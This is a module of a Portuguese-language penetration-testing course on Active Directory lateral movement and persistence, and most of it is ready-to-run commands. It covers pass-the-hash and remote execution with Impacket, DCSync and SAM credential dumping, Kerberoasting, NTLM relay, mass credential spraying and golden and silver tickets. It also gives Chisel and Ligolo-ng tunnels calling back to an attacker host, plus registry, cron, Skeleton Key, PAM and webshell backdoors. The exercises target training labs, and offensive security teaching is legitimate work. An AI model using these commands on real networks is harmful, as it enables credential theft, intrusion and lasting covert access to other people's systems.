# 08 · Movimentação Lateral e Persistência

> [← Anterior: Pós-Exploração](../07-pos-exploracao/README.md) · [Voltar ao índice](../../README.md) · [Próximo: Exfiltração →](../09-exfiltracao/README.md)

---

## Princípio

Expandir o foothold pela rede e manter acesso. Aqui entra o **Active Directory** — alvo favorito em engagements corporativos.

---

## 1. Impacket — a Swiss Army Knife do AD

Coleção de scripts Python da CoreSecurity, imprescindível.

### Execução remota

```bash
# psexec (SMB + service — barulhento, detectado)
psexec.py CORP/admin:'Pass123'@10.0.0.5

# wmiexec (WMI — mais silencioso)
wmiexec.py CORP/admin:'Pass123'@10.0.0.5

# smbexec (Admin$ share)
smbexec.py CORP/admin:'Pass123'@10.0.0.5

# atexec (via scheduled task)
atexec.py CORP/admin:'Pass123'@10.0.0.5 "whoami"

# Pass-the-hash (sem precisar da senha em claro)
psexec.py -hashes :AB123... CORP/admin@10.0.0.5
```

### Dump de credenciais

```bash
# DCSync (secretsdump via replicação AD)
secretsdump.py CORP/admin:'Pass123'@10.0.0.1

# Offline a partir de ntds.dit
secretsdump.py -ntds ntds.dit -system SYSTEM -just-dc LOCAL

# Dump do SAM remoto
secretsdump.py -sam SAM -system SYSTEM LOCAL
```

### Kerberoasting

```bash
# Lista SPNs e pede TGS
GetUserSPNs.py CORP/user:'Pass123' -request -outputfile spns.txt

# Quebra
hashcat -m 13100 spns.txt rockyou.txt
```

### AS-REP Roasting

Usuários com "Do not require pre-auth" podem ter o hash pedido sem credenciais.

```bash
GetNPUsers.py CORP/ -usersfile users.txt -no-pass -outputfile asrep.txt
hashcat -m 18200 asrep.txt rockyou.txt
```

### Relay de NTLM (com Responder + ntlmrelayx)

```bash
# Terminal 1: responder
sudo responder -I eth0 --lm

# Terminal 2: relay para SMB signing = disabled
ntlmrelayx.py -tf targets.txt -smb2support -c "whoami"
```

---

## 2. NetExec / CrackMapExec (nxc)

Repetindo do módulo anterior, mas com foco lateral:

```bash
# Validar credenciais em toda a rede (onde elas funcionam?)
nxc smb 10.0.0.0/24 -u admin -p 'Pass123' --continue-on-success

# Executar comando em múltiplos hosts
nxc smb targets.txt -u admin -p 'Pass123' -x "whoami" --exec-method smbexec

# Pass-the-hash em massa
nxc smb 10.0.0.0/24 -u admin -H AB123... --sam

# Enumerar shares que admin tem acesso
nxc smb 10.0.0.0/24 -u admin -p 'Pass123' --shares

# Enumerar usuários logados
nxc smb 10.0.0.0/24 -u admin -p 'Pass123' --loggedon-users

# WinRM em vez de SMB
nxc winrm 10.0.0.0/24 -u admin -p 'Pass123'

# LDAP
nxc ldap corp.local -u user -p 'Pass123' --users --groups
```

---

## 3. Evil-WinRM

Shell WinRM (porta 5985/5986) com funcionalidades extras.

```bash
evil-winrm -i 10.0.0.5 -u admin -p 'Pass123'
evil-winrm -i 10.0.0.5 -u admin -H AB123...           # pass-the-hash
evil-winrm -i 10.0.0.5 -u admin -p 'Pass123' -s /opt/scripts/   # scripts dir
```

Dentro da shell, comandos úteis:
- `upload arquivo.exe` — envia para o host
- `download arquivo.txt` — baixa
- `menu` — lista recursos extras
- `Invoke-Binary /path/binary.exe args` — roda binário em memória

---

## 4. BloodHound — mapa visual do AD

**Ferramenta indispensável** em qualquer engagement com Active Directory. Visualiza paths de ataque entre objetos.

### Coleta (SharpHound)

```powershell
# Do Windows (com credenciais do domínio)
SharpHound.exe -c All -d corp.local

# Gera um .zip com os arquivos JSON
```

Alternativas de coleta:
- **BloodHound.py** (Linux) — `bloodhound-python -u user -p 'Pass' -d corp.local -c all`
- **SharpHound** via BOF (Cobalt Strike/Sliver)

### Análise (BloodHound GUI)

```bash
# Instalar (BloodHound CE — Community Edition, novo padrão)
docker compose up -d
# Acesse http://localhost:8080

# Importe o .zip com dados
# Queries úteis:
#   - "Shortest Paths to Domain Admins"
#   - "Find Principals with DCSync Rights"
#   - "Kerberoastable Users"
#   - "Find AS-REP Roastable Users"
```

### Edges mais exploráveis

| Edge | Significado |
|---|---|
| `MemberOf` | Herança de grupo |
| `AdminTo` | Admin local em outra máquina |
| `CanRDP` | Pode fazer RDP |
| `GenericAll` | Controle total do objeto |
| `WriteDacl` / `WriteOwner` | Pode alterar permissões/ownership |
| `ForceChangePassword` | Pode trocar senha do usuário |
| `AllowedToDelegate` | Constrained delegation |
| `AddKeyCredentialLink` | Shadow credentials attack |

---

## 5. Rubeus — operações Kerberos avançadas

```powershell
# Lista tickets da sessão
Rubeus.exe triage

# Dump TGTs
Rubeus.exe dump

# Kerberoasting
Rubeus.exe kerberoast /outfile:hashes.txt

# AS-REP roasting
Rubeus.exe asreproast /outfile:asrep.txt

# Pass-the-ticket
Rubeus.exe ptt /ticket:base64hash...

# Golden ticket (precisa do hash do krbtgt)
Rubeus.exe golden /user:admin /domain:corp.local /sid:S-1-5-21-... /krbtgt:HASH /ptt

# Silver ticket
Rubeus.exe silver /service:cifs/SRV01 /rc4:HASH /user:admin /domain:corp.local
```

---

## 6. Pivoting / Tunneling

Para acessar redes internas a partir de um host comprometido.

### Chisel — TCP sobre HTTP(S)

```bash
# No atacante (servidor)
chisel server -p 8080 --reverse --socks5

# No pivot (cliente, comprometido)
chisel client http://ATACANTE:8080 R:socks

# Agora, no atacante: localhost:1080 é SOCKS5 para a rede interna
proxychains4 nmap -sT -Pn 10.0.0.0/24
```

### Ligolo-ng — o tunelador moderno

```bash
# Proxy (no atacante)
./proxy -selfcert

# Agent (no pivot)
./agent -connect ATACANTE:11601 -ignore-cert

# No proxy:
» session
» ifconfig
» start

# Agora, rotas do alvo ficam transparentes no host atacante:
sudo ip route add 10.0.0.0/24 dev ligolo
nmap 10.0.0.0/24   # funciona nativo, sem proxychains
```

### sshuttle — VPN-over-SSH

Se você tem SSH no pivot:

```bash
sshuttle -r user@pivot 10.0.0.0/24
```

### SSH dynamic port forward (SOCKS)

```bash
ssh -D 1080 user@pivot
# Usa proxychains com socks5 127.0.0.1 1080
```

### Port forward com Metasploit

```
portfwd add -l 3306 -p 3306 -r 10.0.0.5
# Agora localhost:3306 aponta para 10.0.0.5:3306 através do meterpreter
```

---

## 7. Persistência

### Windows

| Técnica | Como |
|---|---|
| **Registry Run keys** | `reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Backup /t REG_SZ /d "C:\path\payload.exe"` |
| **Scheduled Task** | `schtasks /create /sc onlogon /tn "Updater" /tr "C:\payload.exe"` |
| **Service** | `sc create "UpdateSvc" binPath="C:\payload.exe" start=auto` |
| **WMI Event Subscription** | Via PowerShell (persistência fileless) |
| **Golden Ticket** | Mimikatz + hash do krbtgt = válido por anos |
| **Skeleton Key** | Mimikatz `misc::skeleton` — backdoor de senha global |
| **Shadow Credentials** | Abuso de `msDS-KeyCredentialLink` |

### Linux

| Técnica | Como |
|---|---|
| **Cron job** | `echo "* * * * * root /tmp/implant" >> /etc/crontab` |
| **Systemd service** | `.service` em `/etc/systemd/system/` |
| **SSH authorized_keys** | Adiciona sua chave pública |
| **MOTD backdoor** | Script em `/etc/update-motd.d/` roda no login |
| **Bashrc hook** | Linhas extras em `~/.bashrc` do alvo |
| **LD_PRELOAD** | Biblioteca maliciosa carregada em todo processo |
| **PAM backdoor** | `libpam-python`, módulo customizado |

### Genérica — webshells

Para aplicações web comprometidas:

- **p0wny-shell** — single-file PHP, leve
- **weevely** — session-based, stealth
- **Chopper** — clássico (usado pela China Chopper APT)

---

## Exercícios

1. Numa rede de laboratório AD (ex.: HTB Pro Lab "Dante" ou o [GOAD lab local](https://github.com/Orange-Cyberdefense/GOAD)), colete com BloodHound e identifique o shortest path para Domain Admin.
2. Faça Kerberoasting numa conta de serviço vulnerável e quebre o hash com Hashcat.
3. Configure um túnel com Ligolo-ng e valide acesso à rede interna via nmap.

---

[← Anterior: Pós-Exploração](../07-pos-exploracao/README.md) · [Voltar ao índice](../../README.md) · [Próximo: Exfiltração →](../09-exfiltracao/README.md)
